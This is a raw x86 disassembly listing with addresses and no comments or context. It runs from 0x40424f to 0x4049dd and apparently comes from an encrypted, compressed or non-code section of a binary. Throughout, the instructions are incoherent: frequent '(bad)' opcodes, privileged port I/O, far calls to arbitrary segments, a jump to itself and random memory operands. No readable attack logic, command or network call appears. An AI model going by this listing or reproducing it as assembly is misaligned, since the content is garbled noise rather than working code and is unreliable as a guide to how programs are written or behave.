  40424f:	mov    esp,0x96aade97
  404254:	dec    eax
  404255:	cwde   
  404256:	adc    ch,BYTE PTR ds:0x1a53b867
  40425c:	add    cl,BYTE PTR [esi]
  40425e:	jl     0x4042cb
  404260:	xchg   edi,eax
  404261:	dec    ebx
  404262:	iret   
  404263:	(bad)  
  404264:	mov    DWORD PTR ds:0x15d926d1,esi
  40426a:	idiv   edi
  40426c:	sub    BYTE PTR [ebp-0x4dc933e8],0xd7
  404273:	cs push edx
  404275:	or     esi,ebx
  404277:	mov    ah,0x17
  404279:	dec    esi
  40427a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40427b:	mov    ?,esp
  40427d:	inc    edi
  40427e:	in     eax,0xf5
  404280:	fisub  WORD PTR [ebx+0x47]
  404283:	pop    ecx
  404284:	mov    ?,edi
  404286:	mov    cl,0xe9
  404288:	mov    cl,0x91
  40428a:	fmulp  st(4),st
  40428c:	cli    
  40428d:	mov    esi,DWORD PTR [bp+0x773d]
  404292:	(bad)  
  404293:	xor    edi,DWORD PTR [esi+0x2b5ba75]
  404299:	jne    0x4042f8
  40429b:	cs xchg esp,eax
  40429d:	jb     0x4042c5
  40429f:	jno    0x40422e
  4042a1:	or     esp,edx
  4042a3:	xchg   ecx,eax
  4042a4:	sbb    DWORD PTR [ecx+0x60fc763a],ebx
  4042aa:	outs   dx,BYTE PTR ds:[esi]
  4042ab:	push   esi
  4042ac:	lds    eax,FWORD PTR [ecx+ebp*2+0x7d13b723]
  4042b3:	sbb    al,0x3a
  4042b5:	and    DWORD PTR [ebp+esi*4-0x74],esp
  4042b9:	mov    bl,0x95
  4042bb:	adc    dh,BYTE PTR [esi]
  4042bd:	aaa    
  4042be:	push   eax
  4042bf:	(bad)  
  4042c0:	cld    
  4042c1:	outs   dx,BYTE PTR ds:[esi]
  4042c2:	lds    ecx,FWORD PTR [eax+edx*1-0x6bc3df25]
  4042c9:	mov    cl,0x9
  4042cb:	push   ebp
  4042cc:	xlat   BYTE PTR ds:[ebx]
  4042cd:	ror    DWORD PTR [ebx+0x6f],1
  4042d0:	push   edi
  4042d1:	xchg   esi,eax
  4042d2:	pop    ebx
  4042d3:	mov    bl,0xb
  4042d5:	xchg   DWORD PTR [ebx-0x72],edx
  4042d8:	sbb    dh,bh
  4042da:	cld    
  4042db:	and    edi,DWORD PTR [edi+eiz*4+0x3d]
  4042df:	or     eax,0xef544b6d
  4042e4:	lahf   
  4042e5:	mov    ch,cl
  4042e7:	rcr    edx,0x72
  4042ea:	fsubr  DWORD PTR [edx+0x49]
  4042ed:	or     DWORD PTR [ecx-0x54],0x74
  4042f1:	in     al,0xd8
  4042f3:	inc    ecx
  4042f4:	mov    ch,BYTE PTR [ebp-0x38]
  4042f7:	sub    edi,DWORD PTR [edi-0xd6245d6]
  4042fd:	idiv   DWORD PTR [eax]
  4042ff:	ss cmp eax,0xb5b7b5be
  404305:	jmp    0x404305
  404307:	push   esi
  404308:	mov    eax,esi
  40430a:	retf   
  40430b:	test   BYTE PTR fs:[edx+0x1910f7e8],al
  404312:	cmp    al,BYTE PTR ds:0x7ccfc96d
  404318:	pop    ebp
  404319:	mov    al,0x9d
  40431b:	add    DWORD PTR [esi+0x3d64087],esi
  404321:	push   ds
  404322:	aam    0x25
  404324:	jmp    DWORD PTR [ebp+edi*8+0x1609fd28]
  40432b:	xor    eax,0xcdd5f208
  404330:	push   es
  404331:	mov    edx,0xcdd6fc34
  404336:	pop    esi
  404337:	add    DWORD PTR [esi+0xe],eax
  40433a:	lahf   
  40433b:	in     al,dx
  40433c:	cwde   
  40433d:	xchg   ebp,eax
  40433e:	sub    ebp,DWORD PTR [eax+0x5c3fdbbf]
  404344:	lods   eax,DWORD PTR ds:[esi]
  404345:	ins    DWORD PTR es:[edi],dx
  404346:	pop    ecx
  404347:	xchg   edi,eax
  404348:	sti    
  404349:	xchg   edi,eax
  40434a:	out    0x79,al
  40434c:	fsubr  QWORD PTR [ebp+0x775a1bf]
  404352:	or     edi,0xffffffc8
  404355:	je     0x40434a
  404357:	jns    0x404356
  404359:	mov    al,ds:0xf2a47aa7
  40435e:	ss aaa 
  404360:	mov    ds,WORD PTR [ecx]
  404362:	xchg   dh,dl
  404364:	inc    eax
  404365:	arpl   WORD PTR [eax+0x4d],dx
  404368:	pushf  
  404369:	push   edx
  40436a:	ins    DWORD PTR es:[edi],dx
  40436b:	pusha  
  40436c:	cmp    edi,ecx
  40436e:	mov    dl,0x61
  404370:	scas   al,BYTE PTR es:[edi]
  404371:	adc    eax,esi
  404373:	shl    BYTE PTR [ebx],cl
  404375:	gs pop esi
  404377:	ror    cl,cl
  404379:	loope  0x4043db
  40437b:	jnp    0x4043f8
  40437d:	push   eax
  40437e:	hlt    
  40437f:	es fwait
  404381:	ins    DWORD PTR es:[edi],dx
  404382:	sbb    al,0x3e
  404384:	jecxz  0x404398
  404386:	inc    ecx
  404387:	dec    esi
  404388:	sbb    ah,bl
  40438a:	nop
  40438b:	mov    bh,BYTE PTR gs:[ebx+0x28a2bd4c]
  404392:	jns    0x4043bb
  404394:	pop    ecx
  404395:	jns    0x4043f2
  404397:	mov    DWORD PTR [edi],esp
  404399:	or     al,BYTE PTR [edx]
  40439b:	std    
  40439c:	imul   edx,DWORD PTR [edx-0x77],0x44
  4043a0:	push   ss
  4043a1:	mov    cl,0xe0
  4043a3:	fstp   DWORD PTR [ebp+0x6492bea8]
  4043a9:	push   ebp
  4043aa:	(bad)  
  4043ab:	repnz add edx,ebx
  4043ae:	jecxz  0x40433c
  4043b0:	test   eax,0x188c4d9f
  4043b5:	cmp    ebp,DWORD PTR [esi+0x83c2c3c]
  4043bb:	xchg   ebp,eax
  4043bc:	push   esi
  4043bd:	sub    ebp,DWORD PTR [ebx+0x54]
  4043c0:	xchg   DWORD PTR [edx+0x15],edx
  4043c3:	fistp  QWORD PTR [esi]
  4043c5:	hlt    
  4043c6:	leave  
  4043c7:	pop    ds
  4043c8:	mov    ds:0x5546ff9a,eax
  4043cd:	inc    ebx
  4043ce:	out    dx,al
  4043cf:	enter  0x3b01,0xcf
  4043d3:	sbb    bh,dh
  4043d5:	mov    dl,0xf9
  4043d7:	dec    eax
  4043d8:	push   0x66634e0b
  4043dd:	call   0x7d05:0x116d817b
  4043e4:	lods   al,BYTE PTR ds:[esi]
  4043e5:	xchg   ecx,eax
  4043e6:	and    al,0xa3
  4043e8:	clc    
  4043e9:	neg    DWORD PTR [ebx-0x7df9f0fe]
  4043ef:	pop    edi
  4043f0:	(bad)  
  4043f1:	inc    eax
  4043f2:	jbe    0x404408
  4043f4:	int    0x96
  4043f6:	or     ecx,ebp
  4043f8:	popf   
  4043f9:	cmc    
  4043fa:	add    BYTE PTR [edx+0x5d],ch
  4043fd:	dec    ebx
  4043fe:	bswap  esi
  404400:	adc    eax,edx
  404402:	mul    BYTE PTR [ebp+0xb341b5f]
  404408:	in     al,dx
  404409:	sub    eax,DWORD PTR [edi+0x1255fba3]
  40440f:	push   0xd3af62b0
  404414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404415:	(bad)  
  404418:	fistp  QWORD PTR [ecx+ebp*8]
  40441b:	adc    ecx,DWORD PTR [esi-0x52]
  40441e:	(bad)  
  40441f:	retf   
  404420:	or     eax,0xffd322b8
  404425:	push   ebp
  404426:	shl    DWORD PTR [esi],1
  404428:	push   edx
  404429:	mov    BYTE PTR [ebx-0x5b975729],bl
  40442f:	xor    BYTE PTR [eax+0x43],0x5
  404433:	pusha  
  404434:	sar    DWORD PTR [ecx+0x3c],1
  404437:	pop    esi
  404438:	(bad)  
  40443a:	mov    ecx,0x481c75a5
  40443f:	mov    cl,0x94
  404441:	jbe    0x404474
  404443:	pop    ecx
  404444:	or     BYTE PTR [ebp+0x25],ah
  404447:	sti    
  404448:	test   ah,bl
  40444a:	push   ebp
  40444b:	scas   al,BYTE PTR es:[edi]
  40444c:	leave  
  40444d:	rcr    BYTE PTR [edi+0x3b442e51],0x79
  404454:	cmp    cl,BYTE PTR [edx-0x12]
  404457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404458:	inc    ebx
  404459:	cwde   
  40445a:	(bad)  
  40445b:	in     eax,dx
  40445c:	jnp    0x4043f2
  40445e:	dec    esi
  40445f:	ins    BYTE PTR es:[edi],dx
  404460:	mov    edi,0xdccbb283
  404465:	fistp  WORD PTR [ebp-0x598b1cf3]
  40446b:	jns    0x404454
  40446d:	movntps XMMWORD PTR [ecx+0x2f812645],xmm7
  404474:	xchg   edi,eax
  404475:	scas   al,BYTE PTR es:[edi]
  404476:	cmp    DWORD PTR [eax+0x764414a9],ebp
  40447c:	stos   BYTE PTR es:[edi],al
  40447d:	pop    edx
  40447e:	add    BYTE PTR [ebx],ah
  404480:	outs   dx,BYTE PTR ds:[esi]
  404481:	(bad)  
  404482:	mov    edx,DWORD PTR [ecx+edi*8+0x3a]
  404486:	cmp    DWORD PTR [ecx],esi
  404488:	retf   
  404489:	aam    0x4
  40448b:	and    eax,0xb452acc3
  404490:	push   ebx
  404491:	push   0xffffffd1
  404493:	stc    
  404494:	inc    eax
  404495:	add    dl,BYTE PTR [edx-0x42]
  404498:	mov    es,WORD PTR [esi*8-0x39c5a864]
  40449f:	mul    DWORD PTR [esi]
  4044a1:	cmp    dl,ah
  4044a3:	inc    edx
  4044a4:	mov    dh,0x8b
  4044a6:	sar    BYTE PTR [ecx+0x6],1
  4044a9:	not    BYTE PTR [eax]
  4044ab:	leave  
  4044ac:	loop   0x404466
  4044ae:	push   esi
  4044af:	mov    bl,BYTE PTR [edx-0x4e411d3d]
  4044b5:	xor    ecx,DWORD PTR [edx+esi*8+0x2c]
  4044b9:	pop    DWORD PTR [esi+0x35c22d32]
  4044bf:	pop    ecx
  4044c0:	sub    al,0x44
  4044c2:	mov    ecx,edi
  4044c4:	pop    es
  4044c5:	test   al,0x52
  4044c7:	mov    al,ds:0x814e20af
  4044cc:	outs   dx,BYTE PTR ds:[esi]
  4044cd:	out    dx,eax
  4044ce:	or     eax,0x3f7514b8
  4044d3:	mov    cl,0x21
  4044d5:	jo     0x404544
  4044d7:	push   ss
  4044d8:	cmp    eax,0x1ef42c90
  4044dd:	xor    al,0x5d
  4044df:	jg     0x4044de
  4044e1:	cmc    
  4044e2:	cmc    
  4044e3:	neg    BYTE PTR [esi]
  4044e5:	popa   
  4044e6:	popa   
  4044e7:	jecxz  0x404484
  4044e9:	xchg   edi,eax
  4044ea:	jns    0x404485
  4044ec:	mov    esp,0x5cb5a023
  4044f1:	data16 and dh,bh
  4044f4:	gs in  eax,dx
  4044f6:	loope  0x4044db
  4044f8:	(bad)  
  4044f9:	jl     0x4044fb
  4044fb:	xchg   edi,eax
  4044fc:	ins    BYTE PTR es:[edi],dx
  4044fd:	fs popa 
  4044ff:	out    0x6,al
  404501:	add    BYTE PTR [eax-0x3e9688f8],bh
  404507:	enter  0xe0f8,0xa1
  40450b:	push   cs
  40450c:	mov    edx,DWORD PTR [edi-0x3b5666af]
  404512:	dec    ebx
  404513:	stc    
  404514:	add    DWORD PTR [esi],ebp
  404516:	mov    esi,0xd5e6bd08
  40451b:	xchg   edi,eax
  40451c:	pop    ecx
  40451d:	mov    al,BYTE PTR [edx+esi*4+0x4f]
  404521:	aam    0xca
  404523:	in     eax,dx
  404524:	jmp    0x4a01f59f
  404529:	test   DWORD PTR [ebx],esp
  40452b:	jnp    0x4044e3
  40452d:	fldcw  WORD PTR [ebx+0x4a2a7bbe]
  404533:	push   edx
  404534:	out    dx,eax
  404535:	mov    ah,0x10
  404537:	mov    BYTE PTR [ecx+0x7fadfcaa],ch
  40453d:	adc    eax,0x35cb2e5c
  404542:	in     eax,0x59
  404544:	cmp    al,0xda
  404546:	sbb    DWORD PTR [eax-0x6d],ebx
  404549:	sbb    eax,0x9c08d45e
  40454e:	cld    
  40454f:	stc    
  404550:	dec    ecx
  404551:	out    0x7d,eax
  404553:	dec    edx
  404554:	ror    BYTE PTR [edi],1
  404556:	shl    cl,cl
  404558:	(bad)  
  40455a:	outs   dx,BYTE PTR ds:[esi]
  40455b:	and    esi,ebp
  40455d:	int    0x94
  40455f:	mul    BYTE PTR [edx+edi*2]
  404562:	dec    ebx
  404563:	ds pop ecx
  404565:	pop    ds
  404566:	jp     0x40453e
  404568:	data16 mov bh,BYTE PTR [edi+0x56]
  40456c:	fld    st(3)
  40456e:	(bad)  
  40456f:	pop    eax
  404570:	pusha  
  404571:	fwait
  404572:	sbb    ecx,eax
  404574:	xchg   ebp,eax
  404575:	mov    eax,ds:0x92433871
  40457a:	dec    ebx
  40457b:	add    al,bh
  40457d:	xchg   ah,bh
  40457f:	in     al,dx
  404580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404581:	pop    esp
  404582:	sbb    bl,BYTE PTR [eax+0x5150f066]
  404588:	in     al,0x25
  40458a:	and    al,0xfa
  40458c:	or     ch,BYTE PTR [ebx+0x1c599790]
  404592:	or     esi,edi
  404594:	scas   al,BYTE PTR es:[edi]
  404595:	sbb    BYTE PTR [ecx-0x115b340b],ch
  40459b:	jg     0x404520
  40459d:	mov    WORD PTR [esi-0x52ea4511],es
  4045a3:	jnp    0x404610
  4045a5:	sub    eax,0xf882dcd7
  4045aa:	pushf  
  4045ab:	unpcklps xmm0,xmm2
  4045ae:	xlat   BYTE PTR ds:[ebx]
  4045af:	call   0x3b354c1e
  4045b4:	add    bh,bh
  4045b6:	mov    ecx,0x58d817d9
  4045bb:	int    0x3c
  4045bd:	dec    esi
  4045be:	dec    edx
  4045bf:	adc    al,0x4f
  4045c1:	stc    
  4045c2:	sbb    DWORD PTR [edx],0xffffff8d
  4045c5:	repz es pop ecx
  4045c8:	sbb    al,0x79
  4045ca:	cwde   
  4045cb:	pop    ebx
  4045cc:	mov    edi,0x583d0390
  4045d1:	fldl2t 
  4045d3:	inc    ebp
  4045d4:	sub    bh,0x9f
  4045d7:	(bad)  
  4045d8:	or     al,0xb6
  4045da:	pop    esp
  4045db:	ret    0x9095
  4045de:	out    0x79,al
  4045e0:	sub    eax,0x8644751c
  4045e5:	test   al,0xe
  4045e7:	ret    
  4045e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045e9:	mov    BYTE PTR [ebp+0x76],bh
  4045ec:	ins    BYTE PTR es:[edi],dx
  4045ed:	popf   
  4045ee:	lods   eax,DWORD PTR ds:[esi]
  4045ef:	add    ebp,DWORD PTR [ecx]
  4045f1:	cmc    
  4045f2:	inc    ebp
  4045f3:	push   0x237455b0
  4045f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045f9:	xchg   dl,bh
  4045fb:	popa   
  4045fc:	fidiv  DWORD PTR cs:[edi+0x6ac053b6]
  404603:	out    dx,al
  404604:	leave  
  404605:	in     al,dx
  404606:	or     ch,BYTE PTR [ebp+0x2f055354]
  40460c:	push   ss
  40460d:	in     al,0xe2
  40460f:	data16 adc al,0x77
  404612:	and    al,0x63
  404614:	std    
  404615:	in     eax,0x30
  404617:	stc    
  404618:	ffree  st(3)
  40461a:	mov    eax,0xee1273d1
  40461f:	aam    0x19
  404621:	jae    0x40463c
  404623:	xchg   DWORD PTR ds:0x7442ce0a,edi
  404629:	(bad)  
  40462a:	mov    edi,0x27c4850
  40462f:	xchg   ebp,eax
  404630:	push   edi
  404631:	stos   DWORD PTR es:[edi],eax
  404632:	inc    ebx
  404633:	call   0x938d:0xa5e47781
  40463a:	dec    ebp
  40463b:	xor    ebp,DWORD PTR [ecx]
  40463d:	dec    esi
  40463e:	in     eax,0xee
  404640:	stos   BYTE PTR es:[edi],al
  404641:	cli    
  404642:	dec    ecx
  404643:	loop   0x4045e5
  404645:	mov    ebp,?
  404647:	retf   
  404648:	call   0x76f1:0x653f41de
  40464f:	mov    ch,0xaa
  404651:	rcr    DWORD PTR [edx+ebp*4+0x5b],1
  404655:	inc    bh
  404657:	adc    al,0x25
  404659:	loopne 0x404638
  40465b:	scas   eax,DWORD PTR es:[edi]
  40465c:	mov    bl,BYTE PTR [ecx+0x2ad73e2c]
  404662:	push   ds
  404663:	inc    edx
  404664:	inc    ebp
  404665:	jle    0x40462b
  404667:	hlt    
  404668:	jle    0x404664
  40466a:	mov    bl,0x3
  40466c:	mov    ds:0x6e7b4b33,eax
  404671:	adc    al,0x5c
  404673:	push   ss
  404674:	fld    TBYTE PTR [ecx+ebp*2]
  404677:	in     eax,dx
  404678:	jbe    0x40461d
  40467a:	cmp    al,0x2
  40467c:	arpl   sp,bx
  40467e:	cmp    BYTE PTR [ebx],al
  404680:	mov    esi,0x5817c634
  404685:	repnz ds xchg ecx,eax
  404688:	in     al,dx
  404689:	stc    
  40468a:	pop    eax
  40468b:	inc    ebx
  40468c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40468d:	push   0x35a6fe34
  404692:	lods   eax,DWORD PTR ds:[esi]
  404693:	daa    
  404694:	fdiv   QWORD PTR [edi]
  404696:	fadd   DWORD PTR [esi*2+0x6b64f792]
  40469d:	mov    dh,0xed
  40469f:	inc    edi
  4046a0:	xor    BYTE PTR [edi-0x17],0xc9
  4046a4:	mov    al,ds:0x2d54108b
  4046a9:	ret    0x3d34
  4046ac:	dec    eax
  4046ad:	frndint 
  4046af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046b0:	dec    esp
  4046b1:	mov    dl,0x0
  4046b3:	mov    ds:0x41670c89,eax
  4046b8:	or     bl,BYTE PTR [eax-0x3b231826]
  4046be:	dec    edx
  4046bf:	ds into 
  4046c1:	jmp    0x40469b
  4046c3:	in     al,0x1
  4046c5:	inc    esi
  4046c6:	cdq    
  4046c7:	outs   dx,DWORD PTR ds:[esi]
  4046c8:	js     0x40470a
  4046ca:	je     0x4046bc
  4046cc:	cmc    
  4046cd:	ss mov ah,0x92
  4046d0:	sbb    bl,BYTE PTR [edx]
  4046d2:	cdq    
  4046d3:	add    BYTE PTR [esi+0xb85de83],0xd3
  4046da:	cmp    al,0x8b
  4046dd:	add    BYTE PTR ds:0xf41c2c16,0x44
  4046e4:	out    dx,al
  4046e5:	cmp    dh,al
  4046e7:	add    bh,BYTE PTR [eax-0x7b]
  4046ea:	int3   
  4046eb:	push   ecx
  4046ec:	ds or  DWORD PTR gs:[edx-0x20b4dd56],0x53
  4046f5:	sbb    edi,DWORD PTR [esp+ebp*4+0x3d889b7d]
  4046fc:	xor    DWORD PTR [eax-0x12],edi
  4046ff:	call   0x9bcab80f
  404704:	xlat   BYTE PTR ds:[ebx]
  404705:	in     al,dx
  404706:	enter  0x64f8,0x11
  40470a:	sbb    ebp,DWORD PTR [eax-0x7d04751]
  404710:	adc    ah,BYTE PTR [edi]
  404712:	jmp    0xceb1:0xc4f42a7e
  404719:	mov    ebp,0x1fb5f3e0
  40471e:	push   ebp
  40471f:	inc    ecx
  404720:	shr    DWORD PTR [ebx-0xb],0xd4
  404724:	dec    edi
  404725:	add    esi,edx
  404727:	mov    dh,0x54
  404729:	outs   dx,DWORD PTR ds:[esi]
  40472a:	inc    esp
  40472b:	imul   esi,DWORD PTR [edx-0x5218a649],0xa6a62cb9
  404735:	test   eax,0xedcc9381
  40473a:	and    al,0x43
  40473c:	push   ss
  40473d:	fisttp WORD PTR [ecx]
  40473f:	push   0x15bb962c
  404744:	(bad)
  404748:	daa    
  404749:	(bad)  
  40474a:	fdivr  QWORD PTR [ebx-0x39b457ad]
  404750:	test   al,0x6b
  404752:	lods   eax,DWORD PTR ds:[esi]
  404753:	cmc    
  404754:	inc    esp
  404755:	mov    WORD PTR [edx],ss
  404757:	xor    al,0x75
  404759:	sbb    BYTE PTR [esi-0x4c],0x2b
  40475d:	inc    ebp
  40475e:	push   cs
  40475f:	hlt    
  404760:	aad    0xa3
  404762:	mov    edi,0xbaa97af5
  404767:	cmp    eax,0x8892e496
  40476c:	scas   eax,DWORD PTR es:[edi]
  40476d:	es push edi
  40476f:	imul   eax,DWORD PTR [esi+0x20],0x56
  404773:	icebp  
  404774:	mov    DWORD PTR [eax-0x6f4775b3],esp
  40477a:	fistp  WORD PTR [eax+0x21]
  40477d:	cmp    eax,0x634a6a24
  404782:	and    ebp,esp
  404784:	xor    al,0xf0
  404786:	xchg   DWORD PTR [ebx+0x50],esi
  404789:	ds (bad) 
  40478b:	mov    eax,ss
  40478d:	dec    esi
  40478e:	loopne 0x404787
  404790:	mov    bh,0xd8
  404792:	lock add edi,DWORD PTR [edi+0x27]
  404796:	or     BYTE PTR [edi+0x7a966821],ah
  40479c:	jge    0x404788
  40479e:	inc    ecx
  40479f:	mov    ebx,0x6d6d5917
  4047a4:	mov    ebx,0xd200714d
  4047a9:	repz jp 0x4047e0
  4047ac:	pushf  
  4047ad:	cmp    esp,eax
  4047af:	add    bl,bl
  4047b1:	in     eax,0xc6
  4047b3:	cmp    ah,BYTE PTR [esp+ebp*8]
  4047b6:	in     eax,dx
  4047b7:	push   ss
  4047b8:	push   ds
  4047b9:	xchg   esi,eax
  4047ba:	xchg   BYTE PTR [edi+0x361ac157],al
  4047c0:	jp     0x40476c
  4047c2:	push   ecx
  4047c3:	gs jecxz 0x40474d
  4047c6:	push   eax
  4047c7:	jae    0x4047d1
  4047c9:	pop    es
  4047ca:	jno    0x4047e5
  4047cc:	push   cs
  4047cd:	cmp    eax,0xe87a83e2
  4047d2:	pop    DWORD PTR [esi+edi*4+0x2f41efd2]
  4047d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047da:	adc    BYTE PTR [ebp-0xcbd039c],dh
  4047e0:	jp     0x4047f4
  4047e2:	push   esi
  4047e3:	pusha  
  4047e4:	nop
  4047e5:	cwde   
  4047e6:	cmc    
  4047e7:	pop    ds
  4047e8:	aam    0x1a
  4047ea:	adc    esi,DWORD PTR es:[edi-0x6e]
  4047ee:	cmp    al,0xec
  4047f0:	cmp    eax,0x246cbd45
  4047f5:	mov    ch,0x62
  4047f7:	adc    DWORD PTR [eax-0x1c],edx
  4047fa:	jg     0x40479c
  4047fc:	jmp    0x404818
  4047fe:	xchg   esi,eax
  4047ff:	mov    ebx,0x2dd54233
  404804:	inc    ax
  404806:	lock in al,0x61
  404809:	jnp    0x4047af
  40480b:	mov    dl,0x5d
  40480d:	lahf   
  40480e:	inc    esi
  40480f:	push   0x24
  404811:	mov    BYTE PTR [eax],cl
  404813:	pop    eax
  404814:	not    dl
  404816:	daa    
  404817:	sub    eax,0x62f158f3
  40481c:	inc    edi
  40481d:	push   edx
  40481e:	dec    esp
  40481f:	pop    ebx
  404820:	adc    BYTE PTR [esi],bl
  404822:	mov    dh,0x3b
  404824:	mov    BYTE PTR [ebx+esi*4],bl
  404827:	and    BYTE PTR [ecx-0x576efc36],0x79
  40482e:	scas   al,BYTE PTR es:[edi]
  40482f:	mov    eax,0x775c99d3
  404834:	inc    edx
  404835:	push   ds
  404836:	jge    0x404862
  404838:	adc    al,0x43
  40483a:	lock pop edi
  40483c:	(bad)  
  40483d:	int3   
  40483e:	or     DWORD PTR [ebx-0x74],eax
  404841:	ret    
  404842:	stc    
  404843:	mov    BYTE PTR [eax+0x2e],bl
  404846:	xlat   BYTE PTR ds:[ebx]
  404847:	push   ss
  404848:	mov    BYTE PTR [ebx-0x6d2a6a32],0xf1
  40484f:	int3   
  404850:	mov    bh,0x68
  404852:	mov    edi,0xcff300e6
  404857:	push   edx
  404858:	out    0xd0,eax
  40485a:	(bad)  
  40485b:	adc    ch,bh
  40485d:	or     bl,bh
  40485f:	inc    edx
  404860:	push   edx
  404861:	mov    ah,0x67
  404863:	imul   al
  404865:	or     ax,0x2797
  404869:	xor    edx,0xc9b075ec
  40486f:	(bad)  
  404870:	xchg   esp,eax
  404871:	ja     0x4048a4
  404873:	xchg   BYTE PTR [edx+0x66],ah
  404876:	sub    al,0xcf
  404878:	or     dh,BYTE PTR [esi-0x50e16f4f]
  40487e:	sub    ch,bh
  404880:	lahf   
  404881:	cmp    ch,BYTE PTR [ebx]
  404883:	shl    BYTE PTR ds:0x4a8b7b80,1
  404889:	daa    
  40488a:	(bad)  
  40488b:	ficomp DWORD PTR [esi+0x425c3e10]
  404891:	sbb    bl,al
  404893:	dec    ecx
  404894:	rcr    DWORD PTR [esi-0x49392211],cl
  40489a:	test   DWORD PTR [ecx+0x2b],edx
  40489d:	push   ebp
  40489e:	int    0xf3
  4048a0:	rcl    BYTE PTR [eax],cl
  4048a2:	jne    0x404904
  4048a4:	aas    
  4048a5:	pusha  
  4048a6:	add    ebp,DWORD PTR [ebx*1+0x524443ac]
  4048ad:	pop    esi
  4048ae:	jmp    0x404839
  4048b0:	mov    BYTE PTR [esi-0x43],cl
  4048b3:	pop    ebp
  4048b4:	ret    0xe568
  4048b7:	cmp    BYTE PTR [ebx+0x1d],0x85
  4048bb:	mov    ecx,0x7439ea17
  4048c0:	push   ebp
  4048c1:	dec    edx
  4048c2:	pop    eax
  4048c3:	pushf  
  4048c4:	mov    cs,WORD PTR [eax]
  4048c6:	fcomp  st(0)
  4048c8:	outs   dx,BYTE PTR ds:[esi]
  4048c9:	dec    ecx
  4048ca:	jle    0x4048f3
  4048cc:	in     eax,0xf5
  4048ce:	stos   BYTE PTR es:[edi],al
  4048cf:	(bad)  
  4048d1:	loop   0x404924
  4048d3:	cwde   
  4048d4:	retf   0xff7
  4048d7:	adc    DWORD PTR [eax-0x57],eax
  4048da:	dec    eax
  4048db:	sbb    al,0x41
  4048dd:	nop
  4048de:	dec    esp
  4048df:	jg     0x404931
  4048e1:	(bad)  
  4048e2:	in     eax,dx
  4048e3:	push   ss
  4048e4:	(bad)  
  4048e5:	xor    DWORD PTR [esi],ebx
  4048e7:	in     eax,0xf7
  4048e9:	inc    edi
  4048ea:	stos   DWORD PTR es:[edi],eax
  4048eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ec:	retf   
  4048ed:	xor    DWORD PTR [ebx],edi
  4048ef:	mov    ebp,0x3687cb30
  4048f4:	jb     0x404877
  4048f6:	test   eax,0x3677267f
  4048fb:	push   0xb4bdb0fd
  404900:	mov    bh,0xba
  404902:	dec    ebp
  404903:	sub    eax,0xd558ebfe
  404908:	iret   
  404909:	and    ch,BYTE PTR [ebx+ebp*8+0x475618e8]
  404910:	mov    ch,0xbd
  404912:	pop    ss
  404913:	and    esi,DWORD PTR [ebx]
  404915:	cmp    esi,DWORD PTR [ebx-0x39086fe6]
  40491b:	push   eax
  40491c:	and    al,ch
  40491e:	sub    ch,dl
  404920:	in     al,dx
  404921:	stos   DWORD PTR es:[edi],eax
  404922:	scas   al,BYTE PTR es:[edi]
  404923:	add    BYTE PTR [esi+0x72],bl
  404926:	add    al,0xb5
  404928:	mov    dl,BYTE PTR [esi]
  40492a:	pop    ds
  40492b:	leave  
  40492c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40492d:	mov    al,ds:0x1e85639
  404932:	xchg   BYTE PTR [edi+0x74],ch
  404935:	adc    al,0xd4
  404937:	cmp    al,0x4
  404939:	ror    DWORD PTR gs:[esi-0x185cf9f8],1
  404940:	jmp    0x404920
  404942:	lock push ebp
  404944:	add    DWORD PTR [ebp+0x48],esp
  404947:	sub    al,0xb8
  404949:	adc    eax,0x9e4ed56a
  40494e:	inc    ecx
  40494f:	mov    WORD PTR ds:0xf6b70b7b,ss
  404955:	cdq    
  404956:	cmp    BYTE PTR [edx+0x31],al
  404959:	xchg   DWORD PTR [esi],eax
  40495b:	ret    0xdb22
  40495e:	or     esi,edx
  404960:	xchg   ecx,ecx
  404962:	fmul   st,st(7)
  404964:	pop    ebx
  404965:	ja     0x404916
  404967:	ret    
  404968:	dec    ebx
  404969:	xchg   DWORD PTR [esi+esi*4],esi
  40496c:	cmp    BYTE PTR [edi],ch
  40496e:	pop    ebx
  40496f:	loop   0x404935
  404971:	in     al,0x6b
  404973:	and    ecx,DWORD PTR [ebp+0x3ed7ff]
  404979:	ror    dh,cl
  40497b:	add    al,al
  40497d:	adc    dl,BYTE PTR [ecx-0x1e8648f8]
  404983:	aad    0x9
  404985:	in     al,dx
  404986:	sbb    bl,bh
  404988:	mov    ds:0xd7134f83,eax
  40498d:	jo     0x40497c
  40498f:	int    0x21
  404991:	dec    ebx
  404992:	inc    edi
  404993:	mov    cl,BYTE PTR [ecx]
  404995:	mov    ch,0x39
  404997:	adc    al,0xb7
  404999:	jne    0x404956
  40499b:	jnp    0x404981
  40499d:	mov    ebp,0xbdc3c0d0
  4049a2:	sahf   
  4049a3:	add    esp,DWORD PTR [esi-0x4]
  4049a6:	jl     0x4049eb
  4049a8:	dec    esp
  4049a9:	dec    ecx
  4049aa:	int3   
  4049ab:	lock clc 
  4049ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ae:	dec    esp
  4049af:	xor    BYTE PTR [ebx+0x19],cl
  4049b2:	out    dx,eax
  4049b3:	ss jae 0x4049ba
  4049b6:	and    dh,BYTE PTR [edx+0x1c]
  4049b9:	jnp    0x404958
  4049bb:	popf   
  4049bc:	(bad)  
  4049bd:	ds icebp 
  4049bf:	nop
  4049c0:	push   ecx
  4049c1:	bound  ebp,QWORD PTR [eax-0x19]
  4049c4:	lods   al,BYTE PTR ds:[esi]
  4049c5:	or     bh,BYTE PTR [eax]
  4049c7:	add    ecx,ebx
  4049c9:	je     0x4049e2
  4049cb:	dec    esp
  4049cc:	dec    edi
  4049cd:	int    0x6e
  4049cf:	test   DWORD PTR [ecx],ebx
  4049d1:	push   ebp
  4049d2:	fimul  DWORD PTR [ecx-0x42]
  4049d5:	lock lods eax,DWORD PTR ds:[esi]
  4049d7:	iret   
  4049d8:	mov    dh,0xeb
  4049da:	stc    
  4049db:	fxch   st(2)
  4049dd:	pop    esp
